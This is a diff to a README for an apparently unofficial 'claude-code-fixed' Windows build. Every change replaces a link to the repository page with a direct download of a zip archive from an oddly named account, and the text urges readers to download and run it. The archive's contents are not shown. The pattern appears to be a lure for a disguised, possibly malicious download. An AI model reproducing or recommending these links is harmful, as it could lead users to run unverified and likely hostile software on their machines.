@@ -1,12 +1,12 @@
 # 🛠️ claude-code-fixed - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed)
+[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)
 
 ## 🚀 Quick Download
 
 Use this page to download and run the app on Windows:
 
-[Open the download page](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed)
+[Open the download page](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)
 
 ## 📥 What This App Does
 
@@ -58,7 +58,7 @@ If both commands show a version number, you are ready.
 ## 📦 Download and Install
 
 1. Open the download page:
-   [https://github.com/featherlike-peperomiasandersii662/claude-code-fixed](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed)
+   [https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)
 
 2. Download the project files to your PC
 
@@ -252,6 +252,6 @@ That means the project is ready for a local Windows workflow after install and b
 
 Open the download page here:
 
-[https://github.com/featherlike-peperomiasandersii662/claude-code-fixed](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed)
+[https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)
 
 Use this link to download and run the files on Windows
